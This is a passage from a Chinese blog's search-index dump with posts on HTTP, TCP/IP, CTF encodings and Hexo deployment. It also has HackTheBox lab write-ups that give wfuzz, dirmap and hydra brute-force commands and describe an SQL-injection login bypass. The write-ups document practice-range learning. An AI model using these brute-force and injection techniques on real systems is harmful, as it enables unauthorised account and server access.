Modified该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304为满足条件的情况。304状态码返回时，不包括任何响应的主体部分。304虽被划分在3XX类别中，但是和重定向没有关系。 附带条件的请求是指采用GET方法的请求报文中包含If-Match,If-Modified-Since,If-None-Match,If-Range,If-Unmodified-Since中任一首部。 307 Temporary Redirect临时重定向。该状态码与302 Found有着相同的含义。302标准禁止POST变换成GET，但实际使用时大家并不遵守。307遵照浏览器标准，不会从POST变成GET，但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况。 4XX客户端错误400 Bad Request该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。 401 Unauthorized该状态码表示发送的请求需要有通过HTTP认证（BASIC认证、DIGEST认证）的认证信息。另外若之前已进行过1次请求，则表示用户认证失败。 返回含有401的响应必须包含一个使用于被请求资源的WWW-Authenticate首部用以质询（challenge）用户信息。当浏览器初次接收到401响应，会弹出认证用的对话窗口。 403 Forbidden该状态码标明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。 404 Not Found该状态码标明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。 5xx服务器错误500 Internal Server Error该状态码标明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障。 503 Service Unavailable该状态码表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入RetryAfter首部字段再返回给客户端。"},{"title":"HTTP详解(三)——HTTP报文内的HTTP信息","date":"09/03/2020","path":"2020/03/09/20200309220109/","text":"HTTP通信过程包括从客户端发往服务器端的请求及从服务器端返回客户端的响应。 HTTP报文用于HTTP协议交互的信息被称为HTTP报文。请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。 HTTP报文本身是由多行（用CR+LF作换行符）数据构成的字符串文本。 HTTP报文大致可分为报文首部和报文主体两块。两者由最初出现的空行（CR+LF）来划分。通常，并不一定要有报文主体。 请求报文及响应报文的结构 编码提升传输速率HTTP在传输数据时可以按照数据原貌直接传输，但也可以在传输过程中通过编码提升传输速率。通过在传输时编码，能有效地处理大量的访问请求。但是，编码的操作需要计算机来完成，因此会消耗更多的CPU资源。 报文主体和实体主体的差异 报文（message） 是HTTP通信中的基本单位，由8位组字节流（octet sequence，其中octet为8个比特）组成，通过HTTP通信传输。 实体（entity） 作为请求或响应的有效载荷数据（补充项）被传输，其内容由实体首部和实体主体组成。 HTTP报文的主体用于传输请求或响应的实体主体。 通常，报文主体等于实体主体。只有当传输中进行编码操作时，实体主体的内容发生变化，猜到是它和报文主体产生差异。 我们可以理解为实体是想要传输的信息，实体通过报文的形式来进行传输。 获取部分内容的范围请求下载中间暂停后，继续下载不用重新开始的问题，叫做范围请求（Range Request）。 针对范围请求，响应会返回状态码为206 Partial Content的响应报文。另外，对于多重范围的范围请求，响应会在首部字段Content-Type标明multipart/byteranges后返回响应报文。 如果服务器端无法响应范围请求，则会返回状态码200 OK和完整的实体内容。 内容协商返回最合适的内容当浏览器的默认语言为英语或中文，访问相同URI的Web页面时，则会显示对应的英语版或中文版的Web页面。这样的机制称为内容协商（Content Negotiation）。"},{"title":"HTTP详解(二)——简单的HTTP协议","date":"09/03/2020","path":"2020/03/09/20200309213940/","text":"HTTP协议用于客户端和服务端之间的通信HTTP协议和TCP/IP协议族内的其他众多协议相同，用于客户端和服务器之间的通信。 请求访问文本或图像等资源的一端称为客户端，而提供资源响应的一端称为服务器端。 有时候，按实际情况，两台计算机作为客户端和服务器端的角色有可能会互换。但就仅从一条通信线路来说，服务器端和客户端的角色是确定的，而用HTTP协议能够明确区分那端是客户端，哪端是服务器端。 通过请求和相应的交换达成通信请求报文是由请求方法、请求URI、协议版本、可选的请求首部字段和内容实体构成的。 响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。 HTTP是不保存状态的协议（对用户的登陆状态不进行保存）HTTP是一种不保存状态，即无状态（stateless）协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。也就是说在HTTP这个级别，协议对于发送过的请求或响应都不做持久化处理。 使用HTTP协议，每当有新的请求发送时，就会有对应的新响应产生。协议本身并不保留之前一切的请求或响应报文的信息。这是为了更快地处理大量事务，确保协议的可伸缩性，而特意把HTTP协议设计成如此简单的。 HTTP/1.1虽然是无状态协议，但为了实现期望的保持状态功能，于是引入了Cookie技术。有了Cookie再用HTTP协议通信，就可以管理状态了。 请求URL定位资源在WWW上，每一信息资源都有统一的且在网上唯一的地址，该地址就叫URL（Uniform Resource Locator,统一资源定位符），它是WWW的统一资源定位标志，就是指网络地址。 URL由三部分组成：资源类型、存放资源的主机域名、资源文件名。也可认为由四部分组成：协议、主机、端口、路径。 protocal://hostname[:port]/path/[;parameters][?query]#fragment 注：带方括号[]的为可选项，默认的port为80 告知服务器意图的HTTP方法GET：获取资源GET方法用来请求访问已被URI识别的资源。指定的资源经服务器端解析后返回响应内容。也就是说，如果请求的资源是文本，那就保持原样返回，如果是向CGI（Common Gateway Interface，通用网关接口）那样的程序，则返回经过执行后的输出结果。 POST：传输实体主体POST方法用来传输实体的主体。 虽然用GET方法也可以传输实体的主体，但一般不用GET方法进行传输，而是用POST方法。虽然POST的功能与GET很相似，但POST的主要目的并不是获取响应的主体内容。 PUT：传输文件PUT方法用来传输文件。就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置。 但是，鉴于HTTP/1.1的PUT方法自身不带验证机制，任何人都可以上传文件，存在安全性问题，因此一般的Web网站不使用该方法。若配合Web应用程序的验证机制，或架构设计采用REST（Representational State Transfer，表征状态转移）标准的同类Web网站，就可能会开放使用PUT方法。 HEAD：获得报文首部HEAD方法和GET方法一样，只是不返回报文主体部分。用于确认URI的有效性及资源更新的日期时间等。 DELETE：删除文件DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源。 但是，HTTP/1.1的DELETE方法本身和PUT方法一样不带验证机制，所以一般的Web网站也不使用DELETE方法，当配合Web应用程序的验证机制，或遵守REST标准时还是有可能开放使用的。 OPTIONS：询问支持的方法OPTIONS方法用来查询针对URI指定的资源支持的方法。 TRACE：追踪路径TRACE方法是让Web服务器端将之前的请求通信环回给客户端的方法。 CONNECT：要求用隧道协议连接代理CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信。主要使用SSL（Secure Sockets Layer，安全套接层）和TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。 重要的是GET方法和POST方法的区别 持久连接节省通信量HTTP通信一次，进行一次TCP的连接与断开，若HTTP传输的信息很多，每次都要进行TCP连接与断开，造成了无谓的通信量开销。 持久连接为解决上述的TCP连接问题，HTTP/1.1和一部分的HTTP/1.0相处了持久连接（HTTP Persistent Connections，也称为HTTP keep-alive或HTTP connection reuse）的方法。持久连接的特点是，只要任意一端没有明确提出断开连接，则保持TCP连接状态。 持久连接的好处在于减少了TCP连接的重复建立和断开造成的额外开销，减轻了服务器端的负载。另外，减少开销的那部分时间，使HTTP请求和响应能够更早地结束，这样Web页面的显示速度也就相应提高了。 在HTTP/1.1中，所有的连接默认都是持久连接，但在HTTP/1.0内并未标准化。虽然有一部分服务器通过非标准的手段实现了持久连接，但服务器端不一定能够支持持久连接。毫无疑问，除了服务器端，客户端也需要支持持久连接。 管线化持久连接使得多数请求以管线化（pipelining）方式发送称为可能。从前发送请求后需等待并收到响应，才能发送下一个请求。管线化技术出现后，不用等待响应亦可直接发送下一个请求。这样就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了。 使用Cookie的状态管理HTTP是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。 为了保留无状态协议这个特征的同事又要解决类似的矛盾问题，于是引入了Cookie技术。Cookie技术通过在请求和响应报文中写入Cookie信息来控制客户端的状态。 Cookie会根据从服务器端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值后发送出去。 服务器端发现客户端发送过来的Cookie后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。"},{"title":"HTTP详解(一)——了解Web及网络基础","date":"09/03/2020","path":"2020/03/09/20200309212639/","text":"使用HTTP协议访问Web通过发送请求获取服务器资源的Web浏览器等，都可称为客户端（client）。 Web使用一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器端等一系列运作流程。协议是指规则的约束。Web是建立在HTTP协议上通信的。 网络协议TCP/IPTCP/IP协议族计算机与网络设备要相互通信，双方就必须基于相同的方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（Protocol）。 协议中存在各式各样的内容。从电缆的规格到IP地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及Web页面显示需要处理的步骤等等。 像这样把与互联网相关联的协议集合起来总称为TCP/IP。也有说法认为，TCP/IP是指TCP和IP这两种协议。还有一种说法认为，TCP/IP是在IP协议的通信过程中，使用到的协议族的统称。 TCP/IP的分层管理TCP/IP协议族里重要的一点就是分层。TCP/IP协议族按层次分为以下4层：应用层、传输层、网络层和数据链路层。 把TCP/IP层次化的好处是，当互联网中某个地方需要改变设计时，只需要把变动的层替换掉就可以，把各层之间的接口部分规划好后，就可以了。 层次化之后，设计也变得相对简单了。处于应用层上的应用可以只考虑分派给自己的任务，而不需要弄清楚对方在地球上哪个地方、对方的传输线路是怎样的、是否能确保传达等问题。 TCP/IP协议族各层的作用 应用层 应用层决定了向用户提供服务时通信的活动。 TCP/IP协议族内预存了各类通用的应用服务。比如，FTP(File Transfer Protocol,文件传输协议）和DNS(Domain Name System，域名系统）服务就是其中两类。HTTP协议也处于该层。 传输层 传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。 在传输层有两个性质不同的协议：TCP（Transmission Control Protocol,传输控制协议）和UDP(User Data Protocol,用户数据包协议）。 网络层 网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单元。该层规定了通过怎样的路径（所谓的传输线路）到达对方计算机，并把数据包传送给对方。 与对方计算机之间通过多态计算机或网络设备进行传输时，网络层说起的作用就是在众多的选项内选择一条传输线路。 链路层（又名数据链路层，网络接口层） 用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card,网络适配器，即网卡），及光纤等物理课件部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。 TCP/IP通信传输流 利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收层则往应用层上走。 首先作为发送端的客户端在应用层（HTTP协议）发出一个想看某个Web页面的HTTP请求。接着，为了传输方便，在传输层（TCP协议）把从应用层处收到的数据（HTTP请求报文）进行分割，并在各个报文上标记序号及端口号后转发给网络层。在网络层（IP协议），增加作为通信目的地的MAC地址后转发给链路层。 这种把数据信息包装起来的做法称为封装（encapsulate）。 与HTTP关系密切的协议：IP、TCP和DNS负责传输的IP协议IP协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是IP地址和MAC地址。 IP地址指明了节点被分配到的地址，MAC地址是指网卡所述的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，MAC地址基本上不会更改。 使用ARP协议凭借MAC地址进行通信。"},{"title":"hackthebox系列——Fuzzy","date":"01/03/2020","path":"2020/03/01/20200301174951/","text":"打开实例后的网站。 点击任何位置，都没有反应，查看源码后分析，该页面没有任何链接能够到其他地方，因此通过工具爆破目录。 这里使用dirmap工具。 1python dirmap.py -i http://docker.hackthebox.eu:31822/ -lcf 注：-lcf表示的是读取配置文件，dirmap不支持通过命令行详细配置，通过github下载dirmap后，可以通过包中的README.md进行学习。 得到其中存在/api的目录，尝试访问，发现无法访问，那么就再api目录下再进行查找发现，扫不到东西了，那么我们换个思路，是不是在这个目录下就有我们需要的文件呐。 我们通过chrome插件Wappalyzer知道该网站的编程语言是PHP。 我们使用dirmap的fuzz模式，扫描api目录下的.php文件。 1python dirmap.py -i http://docker.hackthebox.eu:31822/api/\\&#123;dir\\&#125;.php -lcf 访问action.php。 提示没有设置属性值，那么现在要猜解传递的属性名，我们通过wfuzz来猜解。 1wfuzz --hh 24 -c -w /usr/share/wordlists/dirb/big.txt http://docker.hackthebox.eu:31891/api/action.php?FUZZ 参数解释： 参数 解释 -c 输出带颜色，好看 -w 指定字典 –hh 如下图，wfuzz的输出中有这几项，–hh代表了chars这一列，后面设置的值为当chars值为该值时隐藏，这里表示的就是chars为24时隐藏。其他三者分别为–hc(response)、–hl(lines)、–hw(word)。 这里详细解释一下参数--hc/--hl/--hw--hh。 参数 解释 –hc 通过返回的状态码进行过滤 –hl 通过返回的内容的行数 –hw 通过返回的内容的字数 –hh 通过返回的内容的字符数 我们这里选择字符是因为，观察直接访问action.php的返回，是一串字符，我们可以猜想当正确的属性名被请求时，返回的字符的数量肯定是不同。 这里的24是我们先运行一次不加–hh的参数的时候，发现chars这一列的值是24。 运行后得到结果。 然后访问后，提示需要正确的ID值。 因此继续通过wfuzz来进行猜测具体ID值。 1wfuzz --hh 27 -c -z range,0-100 http://docker.hackthebox.eu:31891/api/action.php?reset=FUZZ 参数解释： 参数 解释 -z 设置payload的类型，这里是设置一个队列，范围在0-100。 最后得到正确的值为20。 通过网站正常请求后，得到最后的flag。 总结在这次的实验中，因为中间选择字典的问题，wfuzz一直没有爆破出正确的参数名，在仔细看了别人的wp之后，才发现自己用的和别人的不一样，但是这里就又有了一个新的问题，在进行这些敏感目录、敏感文件、参数猜测的爆破时候，选择字典的依据是什么，什么情况下选择怎样的字典，这个问题需要弄清楚。 然后贴上两个github上的字典： fuzzdb seclists"},{"title":"hackthebox系列——Cartographer","date":"01/03/2020","path":"2020/03/01/20200301173746/","text":"这是一道很简单的sql注入的题目，打开实例后的网页，就可以看到一个登陆的界面。 尝试一下万能的登陆绕过注入。发现成功绕过登陆。 但是任然没有flag，但是观察url 1http:&#x2F;&#x2F;docker.hackthebox.eu:31960&#x2F;panel.php?info&#x3D;home 指定了info的值为home，这个时候就可以换一个参数，是不是就出来flag了呐。 成功。"},{"title":"hackthebox系列——Lernaean","date":"29/02/2020","path":"2020/02/29/20200229222500/","text":"现在开始在Hack The Box中练习，希望可以对您有所帮助。 这道题目是Challenges-&gt;Web下的Lernaean。我们百度搜索Lernaean，得到的第一个百度百科是水蛇许德拉(Lernaean Hydra)，因此我们可以考虑是通过Hydra进行爆破。 打开实例化后的网页： 可以发现只显示一个输入框和一个提交按钮，查看源码，发现是通过POST方式请求。 现在我们尝试提交一个请求观察返回的变化。 填入1，点击Submit： 观察到返回页面中出现Invalid password!的关键字样，因此，可以开始通过Hydra爆破密码。 1hydra -t 60 -l Administrator -P /usr/share/wordlists/rockyou.txt -o out.txt -f -s 31927 docker.hackthebox.eu http-post-form &quot;/:password=^PASS^:Invalid password&quot; 解释其中的参数 参数 意义 -t 设置线程 -l 设置用户名（因该处提交的表单只验证密码，因此用户名设置与结果无关，所以可以随意设置，并符合hydra的规范） -P 设置字典位置 -o 结果输出位置 -f 匹配到一个之后停止 -s 若不是默认端口，设置端口 http-post-form 以post请求进行爆破 docker.hackthebox.eu 目标域名 /:password=^PASS^:Invalid password 通过:分割开，/表示爆破的目录；password=^PASS^表示post请求表单中的数据，^包裹起来的PASS是字典中的条目，Invalid password表示的是登录失败的特征字符串 运行得到结果： 我们填入密码，提交后，得到返回： 没有发现任何关于flag的信息，因此想到通过bp进行抓包重放。 在响应包中找到flag。"},{"title":"hackthebox系列——注册","date":"29/02/2020","path":"2020/02/29/20200229203020/","text":"最近在看杨老师的网络安全自学篇系列，再看到后面的时候，杨老师介绍了一个在线的靶场：Hack The Box，亲身体验了一下，感觉是一个检验和提升自己的渗透能力，因此介绍给大家。 0x00 简介Hack The Box是一个在线平台，可让您测试和提高网络安全技能。负责任地使用它，不要破坏您的同事… 可以理解该平台是一个在线的靶场，通过类似CTF的形式出题，不过更加接近于真实的环境。通过练习可以学习到各种各样的知识，各种工具的使用。 0x01 注册首先打开官网，向下翻动一小截，发现join。 点击，进入填写邀请码的界面。 我们可以通过F12或在url前加view-source:来查看源码。 可以发现其中引用了/js/inviteapi.min.js，访问https://www.hackthebox.eu/js/inviteapi.min.js 可以看到js源码。 观察到其中有makeInviteCode，我们直接在console中执行该方法。 得到base64编码的字符串，通过在线base64解码网站得到： 需要我们提交一个POST请求，我们这里通过HackBar模拟POST请求。 得到code，发现是base64编码后的，因此再次解码，得到邀请码，填入后，进入注册界面。 最后的验证码是google的人机验证，你懂得，可查看我的个人博客。 然后去填入的邮箱，查收邮件，确认注册，你就可以愉快的进行练习了。可以在challenges中查看题目。 0x02 总结在找到引用的js文件后，分析代码时，不够仔细认真，没有发现其中明显的makeInvateCode，以后在练习中，一定要耐下心来，审查好每一个关键要素，不要遗漏。"},{"title":"CTF_crypto常见加密特征","date":"24/02/2020","path":"2020/02/24/20200224162720/","text":"我们在刚开始做CTF的crypto的题目时，常会不知道给出的加密后的字符串那种加密方式加密的，因此无法做题，会一个一个的去试，因此这篇文章总结一些常见的加密字符串的特征，供大家查阅。 Jother编码它是一种运用于Javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式，其中少量字符包括”[“，”]”，”{“，”}”，”(“，”)”，”!”，”+”。 例子： 1[][(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;[[]]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;[[]]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;[[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;[[]]+[])[+!![]])() 这种题目通常直接将内荣复制到浏览器的console中运行即可得到flag。 ASCII编码常是用字符所对应的ASCII编码的十进制表示字符，若遇到连续的一堆分割的10进制数不妨通过脚本将十进制对应的字符表示出来。 例子 12384 104 101 32 113 117 105 99 107 32 98114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116104 101 32 108 97 122 121 32 100 111 103 解密脚本 123456789o_str = &#x27;84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103&#x27;o_str = o_str.split(&#x27; &#x27;)d_str = &#x27;&#x27;for i in o_str: d_str += chr(int(i))print(d_str) Base32/64/58编码base32的编码表是由（A-Z、2-7）32个可见字符构成，“=”符号用作后缀填充。base64的编码表是由（A-Z、a-z、0-9、+、/）64个可见字符构成，“=”符号用作后缀填充。base58的编码表相比base64少了数字0，大写字母I，O，小写字母 l (这个是L），以及符号‘+’和‘/’ base系列的编码，通常特征值都是在一堆大小写字母和数字后加1-2个等号，若无等号，只存在字母和数字，也可能是base编码，通常是base64。 例子： 12原文：you are so handsomebase64编码：eW91IGFyZSBzbyBoYW5kc29tZQ&#x3D;&#x3D; rot5/13/18/47ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，将其命名为ROT18。ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，用于ROT47编码的字符其ASCII值范围是33－126。 UUencode/XXencode这两种编码和base64都比较相似。 UUencode 12原文：you are so handsomeUUencode编码：3&gt;6]U(&amp;%R92!S;R!H86YD&lt;V]M90&#96;&#96; 特征：有很多的特殊字符看见。 XXencode 12原文：you are so handsomeXXencode编码：HSKxp643mNG-nPm-cMKtYQqxhNE++ 特征：同base64特别相近。 栅栏密码通常这种题目会在题目描述的时候提示你是栅栏加密的。当提示我们是栅栏后，我们可以在在线的解密网站一个一个的尝试，然后其中有意义的一组就是我们的flag。 例子 12密文：felhaagv&#123;ewtehtehfilnakgw&#125;当每组字数为2时，解出：flag&#123;wethinkwehavetheflag&#125; MD5加密这种题目也是，题目描述中会给出，然后直接在线网站破解就行。 URL编码URL编码后的格式是%xx，是该字符对应的ascii码的十六进制表示的前面加%。例如： 1%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67 摩尔斯电码摩尔斯电码主要是由. - 组成，每一个字符之间通常用空格来表示，如 12.-.- ... .- ..- -.- -. . --. -.-- -. . -- ... .- --- ..--.. --.- -.-- -. ..- ...--- -.... .- ---. -.... ----- -.... .--- -.-- ---.. .. ---.. ----- ----- ----. ..- ---.. 通常还可能用A代替.，用B代替-。 这种也是直接在网上找在线的破解工具就可以。 凯撒密码凯撒密码是一种古典加密方式，是替换加密，通常明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 这种题目，一般题目中也是有提示的，告诉你加密方式和偏移量，然后写脚本得到flag就好。 与佛论禅特征： 1佛曰：謹蘇那梵即俱薩怯密摩梵耶瑟帝奢諦侄即離盡諳豆栗諳佛實俱老訶漫得曳羯皤曳缽是梵菩提明怯盧切佛舍心怯世怯怛皤世智呐礙盡咒缽有蒙奢耨苦他奢槃密娑耶梵麼奢般者故皤能俱怖呼梵娑多都滅世缽提亦 遇到这样的，直接在线解密去吧。 培根加密看到一串的A和B，并且五个一组，那么就是培根加密，直接在线解密。 当铺密码当铺密码是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。“羊由大井夫大人王中工”对应的数字为“9158753624”。 rabbit题目提示是rabbit加密，可以直接通过网站解密。 在线加解密网站最后，粘一些在线加解密的网站。"},{"title":"hexo+trivas自动发布到github与coding","date":"22/02/2020","path":"2020/02/22/20200222212413/","text":"写在前面首先，当我们要开始写博客的时候，我们可以有两种选择来发布你写的博客。 其一，在各大博客平台上发布。选择这条途径的话，我们可以省去一系列的麻烦，只专注与自己的内容即可。但是有好多限制，有些内容不能发布。选择的平台可以有很多，如CSDN，简书等。这两个平台都支持markdown的格式，很方便。 其二，则是自己搭建一个博客，可以有动态和静态博客的选择。之前也尝试过动态博客的搭建，首先需要有自己的额服务器，github上有着开源的博客框架，大家可以尝试一下，我是太笨，没有成功，各种环境的依赖问题已经炸裂。下面贴上当时尝试的一个Django所写的框架地址。 然后则是静态博客的搭建，Hexo是一个静态博客的生成框架，使用简单又快速。 下面的文章便介绍我通过Hexo搭建博客所爬过的坑。 从开始到结束，按照搭建博客的顺序书写，大家可以按着这个流程搭建，中间遇到问题可以私信我。 博客搭建搭建过程所用到的环境：Node.js 第一步，安装Node.js。安装后在命令行检查安装是否成功。 12node -vnpm -v 若无报错并返回版本号，证明安装成功。 第二步，安装Hexo1npm install -g hexo-cli 第三部，初始化Hexo创建一个文件夹myblog，用来存放Hexo所生成的文件。 123mkdir myblogcd mybloghexo init 之后我们在文件夹下可以发现生成了hexo博客的文件，目录结构如下。 12345678910111213.├── _config.yml├── node_modules├── package-lock.json├── package.json├── scaffolds│ ├── draft.md│ ├── page.md│ └── post.md├── source│ └── _posts└── themes └── landscape 其中我们只需要其中几个目录与文件。 12345_config.yml # 站点配置文件，需要按照自己的信息进行配置package.json # 搭建博客过程中所安装的插件都在该文件中配置，一般不用手动修改scaffolds # 生成模板，hexo命令生成文件的模板source # 生成静态博客的源码文件，_posts下是文章的存放位置themes # 博客主题的安装目录，landscape是默认主题，之后安装的主题也都在这个文件夹下 现在我们就可以通过以下命令Hexo生成博客了。 123hexo clean # 清理删除public文件夹，每次生成前都需清理hexo g # 生成博客，可以发现会生成一个public文件夹hexo s # 本地启动hexo server 之后就可以通过http://localhost:4000/访问博客。 这里我贴出我的站点_config.yml。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147# Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# hexo-neatneat_enable: trueneat_html: enable: true exclude: neat_css: enable: true exclude: - &#x27;*.min.css&#x27;neat_js: enable: true mangle: true output: compress: exclude: - &#x27;*.min.js&#x27;# Sitetitle: 0pt1mussubtitle: 不温不火，不急不躁，了解hows背后的whysdescription: 文化水平不够可以读，为人处世不同可以学，钱没有可以赚，唯独你的内心必须坚定，你要不断努力，并且相信你自己绝对是一个有价值，值得被尊重和喜欢的人。author: 0pt1musemail: 1040570917@qq.comlanguage: zh-CNtimezone:avatar: /images/avatar.jpg# search: 59fe6eea70113d77622d1c85f2aeb87a# URL## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;url: https://superj.site/root: /permalink: :year/:month/:day/:id/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: posttitlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: falsepost_asset_folder: truerelative_link: falsefuture: truehighlight: enable: true line_number: true auto_detect: false tab_replace:# Home page setting# path: Root path for your blogs index page. (default = &#x27;&#x27;)# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: &#x27;&#x27; per_page: 10 order_by: -date# Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: Butterfly# Searchsearch: path: search.xml field: post format: html limit: 10000jsonContent: dateFormat: DD/MM/YYYY posts: title: true date: true path: true text: true raw: false content: false slug: false updated: false comments: false link: false permalink: false excerpt: false categories: false tags: false author: falsefeed: type: atom path: atom.xml limit: 20 hub: content:sitemap: path: sitemap.xmlbaidusitemap: path: baidusitemap.xml# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: # - type: git # repository: git@github.com:overoptimus/overoptimus.github.io.git # branch: master - type: git repo: coding: git@e.coding.net:overoptimus/overoptimus.git github: git@github.com:overoptimus/overoptimus.github.io.git branch: master 发布到github和coding目前我们只能在本地访问到我们的博客，现在我们将博客托管到github和coding中。 第一步，注册github和coding的账号第二步，创建仓库注册登录后，在首页可发现new repository，新建一个仓库。 github创建名字为username.github.io的仓库，比如我的用户名为overoptimus，我的仓库名为overoptimus.github.io。 coding创建名字为username的仓库，比如我的用户名为overoptimus，我的仓库名为overoptimus。 注：coding的仓库名可以为任意 第三步，生成ssh添加到github和coding在本地命令行中： 12git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot; 这里的yourname和youremail是你在注册时的用户名和邮箱。 可通过以下命令检查是否配置正确。 1git config --list 然后生成ssh： 1ssh-keygen -t rsa -C &quot;youremail&quot; 这时就会提示你在ssh生成在什么位置，我是在mac环境下，是在~/.ssh下。 123.├── id_rsa├── id_rsa.pub 可发现其中有两个文件，id_rsa是秘钥，id_rsa.pub是公钥。我们需要将公钥的内容保存在github和codig中。在网站的setting中可以找到设置ssh的选项。 第四部，安装通过git部署的插件1npm install hexo-deployer-git --save 注：以下若无特殊声明，均在myblog目录下。 第四步，修改_config.yml12345678# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: - type: git repo: coding: git@e.coding.net:overoptimus/overoptimus.git github: git@github.com:overoptimus/overoptimus.github.io.git branch: master 将最后的deploy修改为上面的样子，注意其中的链接是你的仓库的链接。 第五步，发布到github和coding123hexo cleanhexo ghexo s 第六步，在github和coding中打开web服务。分别进入github和coding的仓库中，打开设置页，github是github pages，coding是构建与部署中的静态网站。 之后就可以通过https://overoptimus.github.io/和coding提示的网址访问我们的网站。 第七步，配置个性域名首先要购买一个域名，可以在阿里云购买，也可以在GoDaddy中购买。 然后在解析中，添加CNAME类型的解析指向github和coding的网址。 再添加一条记录为www的记录。 然后我们再添加两条记录，路线选择境外，记录还是www和@，记录值为我们的github pages的网址，我的即为overoptimus.github.io。 之后我们可以通过自己的域名访问我们的博客。 配置主题从搭建博客到现在也更换过了好几个主题，有next、pure、butterfly。 现在使用的是butterfly，配置情况可以参考下面的网址，很详细，按着配置下来就可以了。 Butterfly 